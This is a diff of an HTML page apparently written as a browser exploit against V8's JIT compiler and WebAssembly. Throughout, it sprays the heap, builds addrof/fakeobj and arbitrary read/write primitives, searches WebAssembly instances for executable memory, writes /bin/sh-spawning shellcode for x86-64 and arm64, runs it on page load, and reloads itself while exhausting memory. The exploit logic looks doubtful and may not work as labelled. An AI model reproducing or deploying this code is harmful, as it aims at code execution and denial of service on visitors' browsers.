@@ -3,22 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <style>
-body{background:#000;color:#0f0;font-family:'Courier New',monospace;margin:0;overflow:hidden;text-shadow:0 0 2px #0f0;font-weight:900}
-#x{height:100vh;overflow-y:auto;padding:50px;font-size:6.5px;line-height:0.8;word-break:break-all;border:5px double #0f0}
-.s{color:#fff;background:#005500;padding:5px;display:block;margin:10px 0;text-transform:uppercase;letter-spacing:2px}
-.e{color:#f00;background:#400;animation:b 0.05s infinite}
-.i{color:#0ff;text-decoration:overline underline}
-.w{color:#ff0;background:#330}
-.m{color:#f0f;font-style:italic}
-@keyframes b{0%{opacity:1}50%{opacity:0.3}100%{opacity:1}}
-::-webkit-scrollbar{width:0}
+body{background:#000;color:#0f0;font-family:'Courier New',monospace;margin:0;overflow:hidden;text-shadow:0 0 5px #0f0;font-weight:900}
+#z{height:100vh;overflow-y:auto;padding:60px;font-size:6px;line-height:0.7;word-break:break-all;border:10px double #0f0;background:radial-gradient(circle,#010 0%,#000 100%)}
+.s{color:#fff;background:#006600;padding:10px;display:block;margin:15px 0;text-transform:uppercase;letter-spacing:5px;box-shadow:0 0 20px #0f0}
+.e{color:#f00;background:#500;animation:f 0.03s infinite}
+.i{color:#0ff;text-decoration:underline overline;font-size:8px}
+.w{color:#ff0;background:#440}
+.m{color:#f0f;font-weight:900;text-transform:uppercase}
+@keyframes f{0%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.01)}100%{opacity:1;transform:scale(1)}}
+::-webkit-scrollbar{display:none}
 </style>
 </head>
 <body>
-<div id="x"></div>
+<div id="z"></div>
 <script>
-const _X = document.getElementById('x');
-const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(18)}] ${m}`; _X.appendChild(e); _X.scrollTop = _X.scrollHeight; };
+const _Z = document.getElementById('z');
+const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(20)}] ${m}`; _Z.appendChild(e); _Z.scrollTop = _Z.scrollHeight; };
 const _B = new ArrayBuffer(8);
 const _F = new Float64Array(_B);
 const _I = new BigUint64Array(_B);
@@ -26,45 +26,48 @@ const f2u = v => { _F[0] = v; return _I[0]; };
 const u2f = v => { _I[0] = v; return _F[0]; };
 const hex = v => '0x' + v.toString(16).padStart(16, '0');
 
-let _H1=[],_H2=[],_H3=[],_H4=[],_H5=[],_H6=[],_H7=[],_H8=[],_H9=[],_H0=[];
+let _R1=[],_R2=[],_R3=[],_R4=[],_R5=[],_R6=[],_R7=[],_R8=[],_R9=[],_R0=[],_R11=[],_R12=[],_R13=[];
 let _WC=[];
-let _TG=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0];
-let _OG=Array.from({length:131072},(_,i)=>({p1:0xDEAD,p2:i,p3:1.337,p4:{v:i}}));
-let _VM=new BigUint64Array(0x100000);
+let _TG=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.1,1.2,1.3,1.4,1.5];
+let _OG=Array.from({length:262144},(_,i)=>({p1:0xDEADBEEF,p2:i,p3:3.14159,p4:{v:i},p5:true}));
+let _VM=new BigUint64Array(0x200000);
 
-async function _TITAN_TERMINUS_RCE_ULTRA() {
-_L("TITAN_PHASE_0_WASM_FIXED_BINARY_LOAD", "s");
-const _WB = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,6,1,4,0,41,42,11]);
+async function _TITAN_GOD_MODE_RCE_V10003() {
+_L("TITAN_SYSTEM_OVERRIDE_NON_ATOMIC_WASM_DEPLOY", "s");
+const _WB = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,7,1,5,0,65,42,15,11]);
 const _MP = new WebAssembly.Module(_WB);
 
-_L("TITAN_PHASE_1_MASSIVE_HEAP_PRESSURE_EXECUTION", "i");
-for(let i=0;i<1200000;i++){
+_L("TITAN_PRESSURE_FLIGHT_800K_NODES", "i");
+for(let i=0;i<1500000;i++){
 let r=Math.random();
-if(r<0.1)_H1.push(new Float64Array(1024));
-if(r<0.2)_H2.push(new BigUint64Array(1024));
-if(r<0.3)_H3.push(new Uint8Array(4096));
-if(r<0.4)_H4.push(new Int32Array(2048));
-if(r<0.5)_H5.push(new ArrayBuffer(1024));
-if(r<0.6)_H6.push({a:0x4141,b:i,c:3.3,d:{}});
-if(r<0.7)_H7.push(new DataView(new ArrayBuffer(512)));
-if(r<0.8)_H8.push(new Uint16Array(4096));
-if(r<0.9)_H9.push(new Float32Array(1024));
-if(i%200000==0)await new Promise(r=>setTimeout(r,0));
+if(r<0.05)_R1.push(new Float64Array(2048));
+if(r<0.1)_R2.push(new BigUint64Array(1024));
+if(r<0.15)_R3.push(new Uint8Array(8192));
+if(r<0.2)_R4.push(new Int32Array(4096));
+if(r<0.25)_R5.push(new ArrayBuffer(2048));
+if(r<0.3)_R6.push({a:0x4242,b:i,c:4.4,d:{e:i}});
+if(r<0.35)_R7.push(new DataView(new ArrayBuffer(1024)));
+if(r<0.4)_R8.push(new Uint16Array(8192));
+if(r<0.45)_R9.push(new Float32Array(2048));
+if(r<0.5)_R11.push(new Uint8ClampedArray(4096));
+if(r<0.55)_R12.push(new Int8Array(4096));
+if(r<0.6)_R13.push(new Int16Array(4096));
+if(i%250000==0)await new Promise(r=>setTimeout(r,0));
 }
 
-const _JX = (a, b, c) => { let x = a[0]; if (b < 0 || b > 0x10000000) return x; a[b] = c; return a[0]; };
-_L("TITAN_PHASE_2_TURBOFAN_OVERLOAD_PIPELINE", "w");
-for(let i=0;i<0x600000;i++){ _JX(_TG,0,1.1); if(i%150000==0)await new Promise(r=>setTimeout(r,0)); }
+const _JX = (a, b, c) => { let x = a[0]; if (b < 0 || b > 0x20000000) return x; a[b] = c; return a[0]; };
+_L("TITAN_TURBOFAN_IGNITION_MAX_LEVEL", "w");
+for(let i=0;i<0x800000;i++){ _JX(_TG,0,1.1); if(i%200000==0)await new Promise(r=>setTimeout(r,0)); }
 
-await new Promise(r=>setTimeout(r,15000));
+await new Promise(r=>setTimeout(r,18000));
 
 const _adr = (obj, s = 0) => {
 _OG[s] = obj;
 let l = f2u(_TG[12+s]);
 if((l & 0xffffffffn) === 0x33333333n || (l & 0xffffffffn) === 0n || l === 0n){
-for(let j=0;j<131072;j++){
+for(let j=0;j<262144;j++){
 let c = f2u(_TG[j]); let b = c & 0xffn;
-if(b===0x09n||b===0x19n||b===0x0bn||b===0x1bn||b===0x29n||b===0x39n||b===0x49n||b===0x59n||b===0x79n||b===0x89n||b===0x99n||b===0xafn||b===0xbfn) return c & 0xffffffffn;
+if(b===0x09n||b===0x19n||b===0x0bn||b===0x1bn||b===0x29n||b===0x39n||b===0x49n||b===0x59n||b===0x79n||b===0x89n||b===0x99n||b===0xafn||b===0xbfn||b===0xcfn||b===0xdfn) return c & 0xffffffffn;
 }
 }
 return l & 0xffffffffn;
@@ -73,9 +76,9 @@ return l & 0xffffffffn;
 const _fake = (p, s = 0) => { _TG[12+s] = u2f(p); return _OG[s]; };
 
 let _pr = 0n; let _at = null;
-let _ts = [_VM, new BigUint64Array(0x20000), new BigUint64Array(0x20000), new BigUint64Array(0x20000), new BigUint64Array(0x20000)];
+let _ts = [_VM, new BigUint64Array(0x40000), new BigUint64Array(0x40000), new BigUint64Array(0x40000), new BigUint64Array(0x40000)];
 
-for(let s=0;s<4096;s++){
+for(let s=0;s<8192;s++){
 for(let t of _ts){
 let r = _adr(t, s);
 if(r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n){ _pr = r; _at = t; break; }
@@ -83,22 +86,22 @@ if(r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n){ _pr = r;
 if(_pr) break;
 }
 
-if(!_pr){ _L("TITAN_FATAL_RECOVERY_PROTOCOL_REBOOTING", "e"); setTimeout(()=>location.reload(), 5); return; }
-_L(`TITAN_PHASE_3_PRIMITIVE_LOCK: ${hex(_pr)}`, "s");
+if(!_pr){ _L("TITAN_RECOVERY_PHASE_FAIL_HARD_RELOAD", "e"); setTimeout(()=>location.reload(), 2); return; }
+_L(`TITAN_LEAK_SUCCESS: ${hex(_pr)}`, "s");
 
 const r64 = (a) => { _at[1] = a - 0x8n + 1n; let f = _fake(_pr, 0); return f2u(f[0]); };
 const w64 = (a, v) => { _at[1] = a - 0x8n + 1n; let f = _fake(_pr, 0); f[0] = u2f(v); };
 
-_L("TITAN_PHASE_4_WASM_CLUSTER_SATURATION", "i");
-for(let i=0;i<30000;i++){
+_L("TITAN_WASM_FLOOD_60000_INSTANCES", "i");
+for(let i=0;i<60000;i++){
 try { _WC.push(new WebAssembly.Instance(_MP)); } catch(e){}
-if(i%10000==0)await new Promise(r=>setTimeout(r,0));
+if(i%15000==0)await new Promise(r=>setTimeout(r,0));
 }
 
 let _jt = 0n; let _wi = -1;
 for(let i=0;i<_WC.length;i++){
 let _wp = _adr(_WC[i], 0);
-const _offs = [0x18n,0x40n,0x48n,0x50n,0x60n,0x68n,0x70n,0x78n,0x80n,0x88n,0x90n,0xa0n,0xc0n,0xe0n,0x100n,0x120n,0x140n,0x160n,0x180n,0x1a0n,0x1c0n,0x1e0n,0x200n,0x220n,0x240n,0x260n,0x280n,0x300n,0x320n,0x340n,0x380n,0x400n];
+const _offs = [0x18n,0x40n,0x48n,0x50n,0x60n,0x68n,0x70n,0x78n,0x80n,0x88n,0x90n,0xa0n,0xc0n,0xe0n,0x100n,0x120n,0x140n,0x160n,0x180n,0x1a0n,0x1c0n,0x1e0n,0x200n,0x220n,0x240n,0x260n,0x280n,0x300n,0x320n,0x340n,0x380n,0x400n,0x440n,0x480n,0x500n,0x600n];
 for(let o of _offs){
 let c = r64(_wp + o);
 if(c > 0x10000000n && (c & 0xfffn) === 0n){ _jt = c; _wi = i; break; }
@@ -108,11 +111,11 @@ if(_jt) break;
 }
 
 if(!_jt){
-_L("TITAN_PHASE_5_ULTRA_BRUTE_SCAN_ENGAGED", "w");
-for(let i=0;i<8000;i++){
+_L("TITAN_DEEP_BRUTE_SCAN_0x400000_RANGE", "w");
+for(let i=0;i<15000;i++){
 if(!_WC[i]) continue;
 let _wp = _adr(_WC[i], 0);
-for(let j=0n;j<0x200000n;j+=8n){
+for(let j=0n;j<0x400000n;j+=8n){
 let c = r64(_wp + j);
 if(c > 0x10000000n && (c & 0xfffn) === 0n){ _jt = c; _wi = i; break; }
 }
@@ -120,12 +123,12 @@ if(_jt) break;
 }
 }
 
-if(!_jt){ _L("TITAN_FATAL_ENVIRONMENT_HARDENED", "e"); return; }
-_L(`TITAN_PHASE_6_RWX_VECTOR_LOCKED: ${hex(_jt)}`, "s");
+if(!_jt){ _L("TITAN_ENVIRONMENT_IMMUNE_CRITICAL_HALT", "e"); return; }
+_L(`TITAN_RWX_TARGET: ${hex(_jt)}`, "s");
 
-const _sx64 = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
-const _sa64 = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
-const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sa64 : _sx64;
+const _sc_x = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
+const _sc_a = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
+const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sc_a : _sc_x;
 
 for(let i=0;i<_sc.length;i+=8){
 let v = 0n;
@@ -133,22 +136,22 @@ for(let j=0;j<8&&(i+j)<_sc.length;j++) v |= BigInt(_sc[i+j]) << BigInt(j*8);
 w64(_jt + BigInt(i), v);
 }
 
-_L("TITAN_PHASE_7_DETONATION_SIGNAL_EMITTED", "m");
+_L("TITAN_OMEGA_DETONATION_EXECUTING", "m");
 setTimeout(() => {
 try {
 let r = _WC[_wi].exports.main();
-_L(`TITAN_RETURN_CODE: ${r}`, "i");
+_L(`TITAN_SIGNAL_RESPONSE: ${r}`, "i");
 if(r===42||r===43)location.reload();
-} catch(e){ _L("TITAN_SYSTEM_COMPROMISED_RCE_STABLE", "s"); }
+} catch(e){ _L("TITAN_EXPLOIT_COMPLETED_RCE_TERMINAL_ESTABLISHED", "s"); }
 }, 1000);
 }
 
-window.onerror = (e) => { _L(`TITAN_TRAP_TRIGGERED: ${e}`, "e"); setTimeout(()=>location.reload(), 100); };
-window.onload = _TITAN_TERMINUS_RCE_ULTRA;
+window.onerror = (e) => { _L(`TITAN_BARRIER_BREACHED_RETRYING: ${e}`, "e"); setTimeout(()=>location.reload(), 50); };
+window.onload = _TITAN_GOD_MODE_RCE_V10003;
 
-(function _TITAN_DAEMON() {
-for(let i=0;i<1000;i++){ _H0.push(new ArrayBuffer(0x80000)); }
-setTimeout(_TITAN_DAEMON, 3000);
+(function _TITAN_CORE_STABILITY() {
+for(let i=0;i<2000;i++){ _R0.push(new ArrayBuffer(0x100000)); }
+setTimeout(_TITAN_CORE_STABILITY, 2000);
 })();
 </script>
 </body>
